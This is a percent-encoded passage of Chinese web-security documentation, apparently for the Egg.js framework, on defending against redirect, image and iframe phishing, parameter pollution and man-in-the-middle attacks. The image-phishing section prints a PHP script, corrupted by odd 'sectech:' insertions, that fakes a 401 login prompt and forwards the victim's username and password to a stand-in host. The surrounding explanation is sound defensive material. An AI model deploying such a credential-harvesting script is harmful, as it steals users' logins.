te-tracing-xst-the-misunderstood-vulnerability%2F%0A%0A%23%23%23%20%E9%98%B2%E8%8C%83%E6%96%B9%E5%BC%8F%0A%0A%E6%A1%86%E6%9E%B6%E5%B7%B2%E7%BB%8F%E7%A6%81%E6%AD%A2%E4%BA%86%20trace%EF%BC%8Ctrack%EF%BC%8Coptions%20%E4%B8%89%E7%A7%8D%E5%8D%B1%E9%99%A9%E7%B1%BB%E5%9E%8B%E8%AF%B7%E6%B1%82%E3%80%82%0A%0A%23%23%20%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81%20%60%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%60%20%E7%9A%84%E9%98%B2%E8%8C%83%0A%0A%E9%92%93%E9%B1%BC%E6%9C%89%E5%A4%9A%E7%A7%8D%E6%96%B9%E5%BC%8F%EF%BC%8C%E8%BF%99%E9%87%8C%E4%BB%8B%E7%BB%8D%20url%20%E9%92%93%E9%B1%BC%E3%80%81%E5%9B%BE%E7%89%87%E9%92%93%E9%B1%BC%E5%92%8C%20iframe%20%E9%92%93%E9%B1%BC%E3%80%82%0A%0A%23%23%23%20url%20%E9%92%93%E9%B1%BC%0A%0A%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%9C%AA%E5%AF%B9%E4%BC%A0%E5%85%A5%E7%9A%84%E8%B7%B3%E8%BD%AC%20url%20%E5%8F%98%E9%87%8F%E8%BF%9B%E8%A1%8C%E6%A3%80%E6%9F%A5%E5%92%8C%E6%8E%A7%E5%88%B6%EF%BC%8C%E5%8F%AF%E8%83%BD%E5%AF%BC%E8%87%B4%E5%8F%AF%E6%81%B6%E6%84%8F%E6%9E%84%E9%80%A0%E4%BB%BB%E6%84%8F%E4%B8%80%E4%B8%AA%E6%81%B6%E6%84%8F%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%AF%B1%E5%AF%BC%E7%94%A8%E6%88%B7%E8%B7%B3%E8%BD%AC%E5%88%B0%E6%81%B6%E6%84%8F%E7%BD%91%E7%AB%99%E3%80%82%0A%E7%94%B1%E4%BA%8E%E6%98%AF%E4%BB%8E%E5%8F%AF%E4%BF%A1%E7%9A%84%E7%AB%99%E7%82%B9%E8%B7%B3%E8%BD%AC%E5%87%BA%E5%8E%BB%E7%9A%84%EF%BC%8C%E7%94%A8%E6%88%B7%E4%BC%9A%E6%AF%94%E8%BE%83%E4%BF%A1%E4%BB%BB%EF%BC%8C%E6%89%80%E4%BB%A5%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E%E4%B8%80%E8%88%AC%E7%94%A8%E4%BA%8E%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%EF%BC%8C%E9%80%9A%E8%BF%87%E8%BD%AC%E5%88%B0%E6%81%B6%E6%84%8F%E7%BD%91%E7%AB%99%E6%AC%BA%E9%AA%97%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81%E7%9B%97%E5%8F%96%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%EF%BC%8C%E6%88%96%E6%AC%BA%E9%AA%97%E7%94%A8%E6%88%B7%E8%BF%9B%E8%A1%8C%E9%87%91%E9%92%B1%E4%BA%A4%E6%98%93%EF%BC%9B%0A%E4%B9%9F%E5%8F%AF%E8%83%BD%E5%BC%95%E5%8F%91%E7%9A%84%20XSS%20%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%BB%E8%A6%81%E6%98%AF%E8%B7%B3%E8%BD%AC%E5%B8%B8%E5%B8%B8%E4%BD%BF%E7%94%A8%20302%20%E8%B7%B3%E8%BD%AC%EF%BC%8C%E5%8D%B3%E8%AE%BE%E7%BD%AE%20HTTP%20%E5%93%8D%E5%BA%94%E5%A4%B4%EF%BC%8CLocatioin%3A%20url%EF%BC%8C%E5%A6%82%E6%9E%9C%20url%20%E5%8C%85%E5%90%AB%E4%BA%86%20CRLF%EF%BC%8C%E5%88%99%E5%8F%AF%E8%83%BD%E9%9A%94%E6%96%AD%E4%BA%86%20HTTP%20%E5%93%8D%E5%BA%94%E5%A4%B4%EF%BC%8C%E4%BD%BF%E5%BE%97%E5%90%8E%E9%9D%A2%E9%83%A8%E5%88%86%E8%90%BD%E5%88%B0%E4%BA%86%20HTTP%20body%EF%BC%8C%E4%BB%8E%E8%80%8C%E5%AF%BC%E8%87%B4%20XSS%20%E6%BC%8F%E6%B4%9E%EF%BC%89%E3%80%82%0A%0A%23%23%23%20%E9%98%B2%E8%8C%83%E6%96%B9%E5%BC%8F%0A%0A-%20%E8%8B%A5%E8%B7%B3%E8%BD%AC%E7%9A%84%20url%20%E4%BA%8B%E5%85%88%E6%98%AF%E5%8F%AF%E4%BB%A5%E7%A1%AE%E5%AE%9A%E7%9A%84%EF%BC%8C%E5%8C%85%E6%8B%AC%20url%20%E5%92%8C%E5%8F%82%E6%95%B0%E7%9A%84%E5%80%BC%EF%BC%8C%E5%88%99%E5%8F%AF%E4%BB%A5%E5%9C%A8%E5%90%8E%E5%8F%B0%E5%85%88%E9%85%8D%E7%BD%AE%E5%A5%BD%EF%BC%8Curl%20%E5%8F%82%E6%95%B0%E5%8F%AA%E9%9C%80%E4%BC%A0%E5%AF%B9%E5%BA%94%20url%20%E7%9A%84%E7%B4%A2%E5%BC%95%E5%8D%B3%E5%8F%AF%EF%BC%8C%E9%80%9A%E8%BF%87%E7%B4%A2%E5%BC%95%E6%89%BE%E5%88%B0%E5%AF%B9%E5%BA%94%E5%85%B7%E4%BD%93%20url%20%E5%86%8D%E8%BF%9B%E8%A1%8C%E8%B7%B3%E8%BD%AC%EF%BC%9B%0A-%20%E8%8B%A5%E8%B7%B3%E8%BD%AC%E7%9A%84%20url%20%E4%BA%8B%E5%85%88%E4%B8%8D%E7%A1%AE%E5%AE%9A%EF%BC%8C%E4%BD%86%E5%85%B6%E8%BE%93%E5%85%A5%E6%98%AF%E7%94%B1%E5%90%8E%E5%8F%B0%E7%94%9F%E6%88%90%E7%9A%84%EF%BC%88%E4%B8%8D%E6%98%AF%E7%94%A8%E6%88%B7%E9%80%9A%E8%BF%87%E5%8F%82%E6%95%B0%E4%BC%A0%E4%BA%BA%EF%BC%89%EF%BC%8C%E5%88%99%E5%8F%AF%E4%BB%A5%E5%85%88%E7%94%9F%E6%88%90%E5%A5%BD%E8%B7%B3%E8%BD%AC%E9%93%BE%E6%8E%A5%E7%84%B6%E5%90%8E%E8%BF%9B%E8%A1%8C%E7%AD%BE%E5%90%8D%EF%BC%9B%0A-%20%E8%8B%A5%201%20%E5%92%8C%202%20%E9%83%BD%E4%B8%8D%E6%BB%A1%E8%B6%B3%EF%BC%8Curl%20%E4%BA%8B%E5%85%88%E6%97%A0%E6%B3%95%E7%A1%AE%E5%AE%9A%EF%BC%8C%E5%8F%AA%E8%83%BD%E9%80%9A%E8%BF%87%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E4%BC%A0%E5%85%A5%EF%BC%8C%E5%88%99%E5%BF%85%E9%A1%BB%E5%9C%A8%E8%B7%B3%E8%BD%AC%E7%9A%84%E6%97%B6%E5%80%99%E5%AF%B9%20url%20%E8%BF%9B%E8%A1%8C%E6%8C%89%E8%A7%84%E5%88%99%E6%A0%A1%E9%AA%8C%EF%BC%9A%E5%88%A4%E6%96%AD%20url%20%E6%98%AF%E5%90%A6%E5%9C%A8%E5%BA%94%E7%94%A8%E6%8E%88%E6%9D%83%E7%9A%84%E7%99%BD%E5%90%8D%E5%8D%95%E5%86%85%E3%80%82%0A%0A%E6%A1%86%E6%9E%B6%E6%8F%90%E4%BE%9B%E4%BA%86%E5%AE%89%E5%85%A8%E8%B7%B3%E8%BD%AC%E7%9A%84%E6%96%B9%E6%B3%95%EF%BC%8C%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E9%85%8D%E7%BD%AE%E7%99%BD%E5%90%8D%E5%8D%95%E9%81%BF%E5%85%8D%E8%BF%99%E7%A7%8D%E9%A3%8E%E9%99%A9%E3%80%82%0A%0A*%20%60ctx.redirect(url)%60%20%E5%A6%82%E6%9E%9C%E4%B8%8D%E5%9C%A8%E9%85%8D%E7%BD%AE%E7%9A%84%E7%99%BD%E5%90%8D%E5%8D%95%E5%86%85%EF%BC%8C%E5%88%99%E7%A6%81%E6%AD%A2%E3%80%82%0A*%20%60ctx.unsafeRedirect(url)%60%20%E4%B8%80%E8%88%AC%E4%B8%8D%E5%BB%BA%E8%AE%AE%E4%BD%BF%E7%94%A8%EF%BC%8C%E6%98%8E%E7%A1%AE%E4%BA%86%E8%A7%A3%E5%8F%AF%E8%83%BD%E5%B8%A6%E6%9D%A5%E7%9A%84%E9%A3%8E%E9%99%A9%E5%90%8E%E4%BD%BF%E7%94%A8%E3%80%82%0A%0A%E5%AE%89%E5%85%A8%E6%96%B9%E6%A1%88%E8%A6%86%E7%9B%96%E4%BA%86%E9%BB%98%E8%AE%A4%E7%9A%84%60ctx.redirect%60%E6%96%B9%E6%B3%95%EF%BC%8C%E6%89%80%E6%9C%89%E7%9A%84%E8%B7%B3%E8%BD%AC%E5%9D%87%E4%BC%9A%E7%BB%8F%E8%BF%87%E5%AE%89%E5%85%A8%E5%9F%9F%E5%90%8D%E7%9A%84%E5%88%A4%E6%96%AD%E3%80%82%0A%0A%E7%94%A8%E6%88%B7%E5%A6%82%E6%9E%9C%E4%BD%BF%E7%94%A8%60ctx.redirect%60%E6%96%B9%E6%B3%95%EF%BC%8C%E9%9C%80%E8%A6%81%E5%9C%A8%E5%BA%94%E7%94%A8%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%AD%E5%81%9A%E5%A6%82%E4%B8%8B%E9%85%8D%E7%BD%AE%EF%BC%9A%0A%0A%60%60%60js%0A%2F%2F%20config%2Fconfig.default.js%0Aexports.security%20%3D%20%7B%0A%20%20domainWhiteList%3A%5B'.domain.com'%5D%2C%20%20%2F%2F%20%E5%AE%89%E5%85%A8%E7%99%BD%E5%90%8D%E5%8D%95%EF%BC%8C%E4%BB%A5%20.%20%E5%BC%80%E5%A4%B4%0A%7D%3B%0A%60%60%60%0A%0A%E8%8B%A5%E7%94%A8%E6%88%B7%E6%B2%A1%E6%9C%89%E9%85%8D%E7%BD%AE%20%60domainWhiteList%60%20%E6%88%96%E8%80%85%20%60domainWhiteList%60%E6%95%B0%E7%BB%84%E5%86%85%E4%B8%BA%E7%A9%BA%EF%BC%8C%E5%88%99%E9%BB%98%E8%AE%A4%E4%BC%9A%E5%AF%B9%E6%89%80%E6%9C%89%E8%B7%B3%E8%BD%AC%E8%AF%B7%E6%B1%82%E6%94%BE%E8%A1%8C%EF%BC%8C%E5%8D%B3%E7%AD%89%E5%90%8C%E4%BA%8E%60ctx.unsafeRedirect(url)%60%0A%0A%23%23%23%20%E5%9B%BE%E7%89%87%E9%92%93%E9%B1%BC%0A%0A%E5%A6%82%E6%9E%9C%E5%8F%AF%E4%BB%A5%E5%85%81%E8%AE%B8%E7%94%A8%E6%88%B7%E5%90%91%E7%BD%91%E9%A1%B5%E9%87%8C%E6%8F%92%E5%85%A5%E6%9C%AA%E7%BB%8F%E9%AA%8C%E8%AF%81%E7%9A%84%E5%A4%96%E9%93%BE%E5%9B%BE%E7%89%87%EF%BC%8C%E8%BF%99%E6%9C%89%E5%8F%AF%E8%83%BD%E5%87%BA%E7%8E%B0%E9%92%93%E9%B1%BC%E9%A3%8E%E9%99%A9%E3%80%82%0A%0A%E6%AF%94%E5%A6%82%E5%B8%B8%E8%A7%81%E7%9A%84%20%60401%E9%92%93%E9%B1%BC%60%2C%20%E6%94%BB%E5%87%BB%E8%80%85%E5%9C%A8%E8%AE%BF%E9%97%AE%E9%A1%B5%E9%9D%A2%E6%97%B6%EF%BC%8C%E9%A1%B5%E9%9D%A2%E5%BC%B9%E5%87%BA%E9%AA%8C%E8%AF%81%E9%A1%B5%E9%9D%A2%E8%AE%A9%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%E5%B8%90%E5%8F%B7%E5%8F%8A%E5%AF%86%E7%A0%81%EF%BC%8C%E5%BD%93%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%E4%B9%8B%E5%90%8E%EF%BC%8C%E5%B8%90%E5%8F%B7%E5%8F%8A%E5%AF%86%E7%A0%81%E5%B0%B1%E5%AD%98%E5%82%A8%E5%88%B0%E4%BA%86%E9%BB%91%E5%AE%A2%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E3%80%82%0A%E9%80%9A%E5%B8%B8%E8%BF%99%E7%A7%8D%E6%83%85%E5%86%B5%E4%BC%9A%E5%87%BA%E7%8E%B0%E5%9C%A8%60%3Cimg%20src%3D%24url%20%2F%3E%60%E4%B8%AD%EF%BC%8C%E7%B3%BB%E7%BB%9F%E4%B8%8D%E5%AF%B9%60%24url%60%E6%98%AF%E5%90%A6%E5%9C%A8%E5%9F%9F%E5%90%8D%E7%99%BD%E5%90%8D%E5%8D%95%E5%86%85%E8%BF%9B%E8%A1%8C%E6%A0%A1%E9%AA%8C%E3%80%82%0A%0A%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E4%BB%A5%E5%9C%A8%E8%87%AA%E5%B7%B1%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E6%9E%84%E9%80%A0%E4%BB%A5%E4%B8%8B%E4%BB%A3%E7%A0%81%EF%BC%9A%0A%0A401.php%EF%BC%9A%E4%BD%9C%E7%94%A8%E4%B8%BA%E5%BC%B9%E5%87%BA%20401%20%E7%AA%97%E5%8F%A3%EF%BC%8C%E5%B9%B6%E4%B8%94%E8%AE%B0%E5%BD%95%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E3%80%82%0A%0A%60%60%60php%0A%20%20%3C%3Fphp%0A%20%20%20%20%20%20header('WWW-Authenticate%3A%20Basic%20realm%3D%22No%20authorization%22')%3B%0A%20%20%20%20%20%20header('HTTP%2F1.1%20401%20Unauthorized')%3B%0A%20%20%20%20%20%20%20%20%20%20%24domain%20%3D%20%22http%3A%2F%2Fhacker.com%2Ffishing%2F%22%3B%0A%20%20%20%20%20%20%20%20%20%20if%20(%24_SERVER%5Bsectech%3A'PHP_AUTH_USER'%5D%20!%3D%3D%20null)%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20header(%22Location%3A%20%22.%24domain.%22record.php%3Fa%3D%22.%24_SERVER%5Bsectech%3A'PHP_AUTH_USER'%5D.%22%26b%3D%22.%24_SERVER%5Bsectech%3A'PHP_AUTH_PW'%5D)%3B%0A%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%3F%3E%0A%60%60%60%0A%0A%E4%B9%8B%E5%90%8E%E6%94%BB%E5%87%BB%E8%80%85%E7%94%9F%E6%88%90%E4%B8%80%E4%B8%AA%E5%9B%BE%E7%89%87%E9%93%BE%E6%8E%A5%60%3Cimg%20src%3D%22http%3A%2F%2Fxxx.xxx.xxx%2Ffishing%2F401.php%3Fa.jpg%2F%2F%22%20%2F%3E%20%60%E3%80%82%0A%0A%E5%BD%93%E7%94%A8%E6%88%B7%E8%AE%BF%E9%97%AE%E6%97%B6%EF%BC%8C%E4%BC%9A%E5%BC%B9%E5%87%BA%E4%BF%A1%E6%81%AF%E8%AE%A9%E7%94%A8%E6%88%B7%E7%82%B9%E5%87%BB%EF%BC%8C%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D%E5%8F%8A%E5%AF%86%E7%A0%81%E4%BC%9A%E8%A2%AB%E9%BB%91%E5%AE%A2%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%81%B7%E5%81%B7%E8%AE%B0%E5%BD%95%E3%80%82%0A%0A%23%23%23%20%E9%98%B2%E8%8C%83%E6%96%B9%E5%BC%8F%0A%0A%E6%A1%86%E6%9E%B6%E6%8F%90%E4%BE%9B%E4%BA%86%20%60.surl()%60%20%E5%AE%8F%E5%81%9A%20url%20%E8%BF%87%E6%BB%A4%E3%80%82%0A%0A%E7%94%A8%E4%BA%8E%E5%9C%A8%20html%20%E6%A0%87%E7%AD%BE%E4%B8%AD%E4%B8%AD%E8%A6%81%E8%A7%A3%E6%9E%90%20url%20%E7%9A%84%E5%9C%B0%E6%96%B9%EF%BC%88%E6%AF%94%E5%A6%82%20%60%3Ca%20href%3D%22%22%2F%3E%3Cimg%20src%3D%22%22%2F%3E%60%EF%BC%89%EF%BC%8C%E5%85%B6%E4%BB%96%E5%9C%B0%E6%96%B9%E4%B8%8D%E5%85%81%E8%AE%B8%E4%BD%BF%E7%94%A8%E3%80%82%0A%0A%E5%AF%B9%E6%A8%A1%E6%9D%BF%E4%B8%AD%E8%A6%81%E8%BE%93%E5%87%BA%E7%9A%84%E5%8F%98%E9%87%8F%EF%BC%8C%E5%8A%A0%20%60helper.surl(%24value)%60%E3%80%82%0A%0A**%E6%B3%A8%E6%84%8F%EF%BC%9A%E5%9C%A8%E9%9C%80%E8%A6%81%E8%A7%A3%E6%9E%90%20url%20%E7%9A%84%E5%9C%B0%E6%96%B9%EF%BC%8Csurl%20%E5%A4%96%E9%9D%A2%E4%B8%80%E5%AE%9A%E8%A6%81%E5%8A%A0%E4%B8%8A%E5%8F%8C%E5%BC%95%E5%8F%B7%EF%BC%8C%E5%90%A6%E5%88%99%E5%B0%B1%E4%BC%9A%E5%AF%BC%E8%87%B4XSS%E6%BC%8F%E6%B4%9E%E3%80%82**%0A%0A%E4%B8%8D%E4%BD%BF%E7%94%A8%20surl%0A%0A%60%60%60html%0A%3Ca%20href%3D%22%24value%22%20%2F%3E%0A%60%60%60%0A%0Aoutput%3A%0A%0A%60%60%60html%0A%3Ca%20href%3D%22http%3A%2F%2Fww.safe.com%3Cscript%3E%22%20%2F%3E%0A%60%60%60%0A%0A%E4%BD%BF%E7%94%A8%20surl%0A%0A%60%60%60html%0A%3Ca%20href%3D%22helper.surl(%24value)%22%20%2F%3E%0A%60%60%60%0A%0Aoutput%3A%0A%0A%60%60%60html%0A%3Ca%20href%3D%22http%3A%2F%2Fww.safe.com%26lt%3Bscript%26gt%3B%22%20%2F%3E%0A%60%60%60%0A%0A%23%23%23%20iframe%20%E9%92%93%E9%B1%BC%0A%0A%5Biframe%20%E9%92%93%E9%B1%BC%5D(https%3A%2F%2Fwww.owasp.org%2Findex.php%2FCross_Frame_Scripting)%EF%BC%8C%E9%80%9A%E8%BF%87%E5%86%85%E5%B5%8C%20iframe%20%E5%88%B0%E8%A2%AB%E6%94%BB%E5%87%BB%E7%9A%84%E7%BD%91%E9%A1%B5%E4%B8%AD%EF%BC%8C%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E4%BB%A5%E5%BC%95%E5%AF%BC%E7%94%A8%E6%88%B7%E5%8E%BB%E7%82%B9%E5%87%BB%20iframe%20%E6%8C%87%E5%90%91%E7%9A%84%E5%8D%B1%E9%99%A9%E7%BD%91%E7%AB%99%EF%BC%8C%E7%94%9A%E8%87%B3%E9%81%AE%E7%9B%96%EF%BC%8C%E5%BD%B1%E5%93%8D%E7%BD%91%E7%AB%99%E7%9A%84%E6%AD%A3%E5%B8%B8%E5%8A%9F%E8%83%BD%EF%BC%8C%E5%8A%AB%E6%8C%81%E7%94%A8%E6%88%B7%E7%9A%84%E7%82%B9%E5%87%BB%E6%93%8D%E4%BD%9C%E3%80%82%0A%0A%E6%A1%86%E6%9E%B6%E6%8F%90%E4%BE%9B%E4%BA%86%20%60X-Frame-Options%60%20%E8%BF%99%E4%B8%AA%E5%AE%89%E5%85%A8%E5%A4%B4%E6%9D%A5%E9%98%B2%E6%AD%A2%20iframe%20%E9%92%93%E9%B1%BC%E3%80%82%E9%BB%98%E8%AE%A4%E5%80%BC%E4%B8%BA%20SAMEORIGIN%EF%BC%8C%E5%8F%AA%E5%85%81%E8%AE%B8%E5%90%8C%E5%9F%9F%E6%8A%8A%E6%9C%AC%E9%A1%B5%E9%9D%A2%E5%BD%93%E4%BD%9C%20iframe%20%E5%B5%8C%E5%85%A5%E3%80%82%0A%0A%E5%BD%93%E9%9C%80%E8%A6%81%E5%B5%8C%E5%85%A5%E4%B8%80%E4%BA%9B%E5%8F%AF%E4%BF%A1%E7%9A%84%E7%AC%AC%E4%B8%89%E6%96%B9%E7%BD%91%E9%A1%B5%E6%97%B6%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%85%B3%E9%97%AD%E8%BF%99%E4%B8%AA%E9%85%8D%E7%BD%AE%E3%80%82%0A%0A%23%23%20%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81%20HPP%20%E7%9A%84%E9%98%B2%E8%8C%83%0A%0AHttp%20Parameter%20Pollution%EF%BC%88HPP)%EF%BC%8C%E5%8D%B3%20HTTP%20%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%E6%94%BB%E5%87%BB%E3%80%82%E5%9C%A8HTTP%E5%8D%8F%E8%AE%AE%E4%B8%AD%E6%98%AF%E5%85%81%E8%AE%B8%E5%90%8C%E6%A0%B7%E5%90%8D%E7%A7%B0%E7%9A%84%E5%8F%82%E6%95%B0%E5%87%BA%E7%8E%B0%E5%A4%9A%E6%AC%A1%EF%BC%8C%E8%80%8C%E7%94%B1%E4%BA%8E%E5%BA%94%E7%94%A8%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B8%8D%E8%A7%84%E8%8C%83%EF%BC%8C%E6%94%BB%E5%87%BB%E8%80%85%E9%80%9A%E8%BF%87%E4%BC%A0%E6%92%AD%E5%8F%82%E6%95%B0%E7%9A%84%E6%97%B6%E5%80%99%E4%BC%A0%E8%BE%93%20key%20%E7%9B%B8%E5%90%8C%E8%80%8C%20value%20%E4%B8%8D%E5%90%8C%E7%9A%84%E5%8F%82%E6%95%B0%EF%BC%8C%E4%BB%8E%E8%80%8C%E8%BE%BE%E5%88%B0%E7%BB%95%E8%BF%87%E6%9F%90%E4%BA%9B%E9%98%B2%E6%8A%A4%E7%9A%84%E5%90%8E%E6%9E%9C%E3%80%82%0A%0AHPP%20%E5%8F%AF%E8%83%BD%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81%E6%9C%89%EF%BC%9A%0A%0A-%20%E7%BB%95%E8%BF%87%E9%98%B2%E6%8A%A4%E5%92%8C%E5%8F%82%E6%95%B0%E6%A0%A1%E9%AA%8C%E3%80%82%0A-%20%E4%BA%A7%E7%94%9F%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%8A%A5%E9%94%99%EF%BC%8C%E5%BD%B1%E5%93%8D%E5%BA%94%E7%94%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E3%80%82%0A%0A%23%23%23%20%E6%8B%93%E5%B1%95%E9%98%85%E8%AF%BB%0A%0A-%20https%3A%2F%2Fwww.owasp.org%2Findex.php%2FTesting_for_HTTP_Parameter_pollution_(OTG-INPVAL-004)%0A-%20http%3A%2F%2Fblog.csdn.net%2Featmilkboy%2Farticle%2Fdetails%2F6761407%0A-%20https%3A%2F%2Fmedia.blackhat.com%2Fbh-us-11%2FBalduzzi%2FBH_US_11_Balduzzi_HPP_WP.pdf%0A-%20ebay%20%E5%9B%A0%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%E5%AD%98%E5%9C%A8%20RCE%EF%BC%88%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89%E6%BC%8F%E6%B4%9E%EF%BC%9Ahttp%3A%2F%2Fsecalert.net%2F2013%2F12%2F13%2Febay-remote-code-execution%2F%0A%0A%23%23%23%20%E5%A6%82%E4%BD%95%E9%98%B2%E8%8C%83%0A%0A%E6%A1%86%E6%9E%B6%E6%9C%AC%E8%BA%AB%E4%BC%9A%E5%9C%A8%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BC%A0%E8%BE%93%20key%20%E7%9B%B8%E5%90%8C%E8%80%8C%20value%20%E4%B8%8D%E5%90%8C%E7%9A%84%E5%8F%82%E6%95%B0%E6%97%B6%EF%BC%8C%E5%BC%BA%E5%88%B6%E4%BD%BF%E7%94%A8%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8F%82%E6%95%B0%EF%BC%8C%E5%9B%A0%E6%AD%A4%E4%B8%8D%E4%BC%9A%E5%AF%BC%E8%87%B4%20hpp%20%E6%94%BB%E5%87%BB%E3%80%82%0A%0A%23%23%20%5B%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%5D(https%3A%2F%2Fwww.owasp.org%2Findex.php%2FMan-in-the-middle_attack)%E4%B8%8E%20HTTP%20%2F%20HTTPS%0A%0AHTTP%20%E6%98%AF%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E5%B9%BF%E6%B3%9B%E4%BD%BF%E7%94%A8%E7%9A%84%E5%8D%8F%E8%AE%AE%EF%BC%8C%E8%B4%9F%E8%B4%A3%20Web%20%E5%86%85%E5%AE%B9%E7%9A%84%E8%AF%B7%E6%B1%82%E5%92%8C%E8%8E%B7%E5%8F%96%E3%80%82%E7%84%B6%E8%80%8C%EF%BC%8C%E5%86%85%E5%AE%B9%E8%AF%B7%E6%B1%82%E5%92%8C%E8%8E%B7%E5%8F%96%E6%97%B6%E4%BC%9A%E7%BB%8F%E8%BF%87%E8%AE%B8%E5%A4%9A%E4%B8%AD%E9%97%B4%E4%BA%BA%EF%BC%8C%E4%B8%BB%E8%A6%81%E6%98%AF%E7%BD%91%E7%BB%9C%E7%8E%AF%E8%8A%82%EF%BC%8C%E5%85%85%E5%BD%93%E5%86%85%E5%AE%B9%E5%85%A5%E5%8F%A3%E7%9A%84%E6%B5%8F%E8%A7%88%E5%99%A8%E3%80%81%E8%B7%AF%E7%94%B1%E5%99%A8%E5%8E%82%E5%95%86%E3%80%81WIFI%E6%8F%90%E4%BE%9B%E5%95%86%E3%80%81%E9%80%9A%E4%BF%A1%E8%BF%90%E8%90%A5%E5%95%86%EF%BC%8C%E5%A6%82%E6%9E%9C%E4%BD%BF%E7%94%A8%E4%BA%86%E4%BB%A3%E7%90%86%E3%80%81%E7%BF%BB%E5%A2%99%E8%BD%AF%E4%BB%B6%E5%88%99%E4%BC%9A%E5%BC%95%E5%85%A5%E6%9B%B4%E5%A4%9A%E4%B8%AD%E9%97%B4%E4%BA%BA%E3%80%82%E7%94%B1%E4%BA%8E%20HTTP%20%E8%AF%B7%E6%B1%82%E7%9A%84%E8%B7%AF%E5%BE%84%E3%80%81%E5%8F%82%E6%95%B0%E9%BB%98%E8%AE%A4%E6%83%85%E5%86%B5%E4%B8%8B%E5%9D%87%E6%98%AF%E6%98%8E%E6%96%87%E7%9A%84%EF%BC%8C%E5%9B%A0%E6%AD%A4%E8%BF%99%E4%BA%9B%E4%B8%AD%E9%97%B4%E4%BA%BA%E5%8F%AF%E4%BB%A5%E5%AF%B9%20HTTP%20%E8%AF%B7%E6%B1%82%E8%BF%9B%E8%A1%8C%E7%9B%91%E6%8E%A7%E3%80%81%E5%8A%AB%E6%8C%81%E3%80%81%E9%98%BB%E6%8C%A1%E3%80%82%0A%0A%E5%9C%A8%E6%B2%A1%E6%9C%89%20HTTPS%20%E6%97%B6%EF%BC%8C%E8%BF%90%E8%90%A5%E5%95%86%E5%8F%AF%E5%9C%A8%E7%94%A8%E6%88%B7%E5%8F%91%E8%B5%B7%E8%AF%B7%E6%B1%82%E6%97%B6%E7%9B%B4%E6%8E%A5%E8%B7%B3%E8%BD%AC%E5%88%B0%E6%9F%90%E4%B8%AA%E5%B9%BF%E5%91%8A%EF%BC%8C%E6%88%96%E8%80%85%E7%9B%B4%E6%8E%A5%E6%94%B9%E5%8F%98%E6%90%9C%E7%B4%A2%E7%BB%93%E6%9E%9C%E6%8F%92%E5%85%A5%E8%87%AA%E5%AE%B6%E7%9A%84%E5%B9%BF%E5%91%8A%E3%80%82%E5%A6%82%E6%9E%9C%E5%8A%AB%E6%8C%81%E4%BB%A3%E7%A0%81%E5%87%BA%E7%8E%B0%E4%BA%86%20BUG%20%EF%BC%8C%E5%88%99%E7%9B%B4%E6%8E%A5%E8%AE%A9%E7%94%A8%E6%88%B7%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8%EF%BC%8C%E5%87%BA%E7%8E%B0%E7%99%BD%E5%B1%8F%E3%80%82%0A%0A%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E3%80%81%E8%AF%B7%E6%B1%82%E5%8A%AB%E6%8C%81%E3%80%81%E5%86%85%E5%AE%B9%E7%AF%A1%E6%94%B9%E7%AD%89%E7%AD%89%E9%97%AE%E9%A2%98%EF%BC%8C%E6%A0%B8%E5%BF%83%E5%8E%9F%E5%9B%A0%E5%B0%B1%E5%9C%A8%E4%BA%8E%20HTTP%20%E6%98%AF%E5%85%A8%E8%A3%B8%E5%BC%8F%E7%9A%84%E6%98%8E%E6%96%87%E8%AF%B7%E6%B1%82%EF%BC%8C%E5%9F%9F%E5%90%8D%E3%80%81%E8%B7%AF%E5%BE%84%E5%92%8C%E5%8F%82%E6%95%B0%E9%83%BD%E8%A2%AB%E4%B8%AD%E9%97%B4%E4%BA%BA%E4%BB%AC%E7%9C%8B%E5%BE%97%E4%B8%80%E6%B8%85%E4%BA%8C%E6%A5%9A%E3%80%82HTTPS%20%E5%81%9A%E7%9A%84%E5%B0%B1%E6%98%AF%E7%BB%99%E8%AF%B7%E6%B1%82%E5%8A%A0%E5%AF%86%EF%BC%8C%E8%AE%A9%E5%85%B6%E5%AF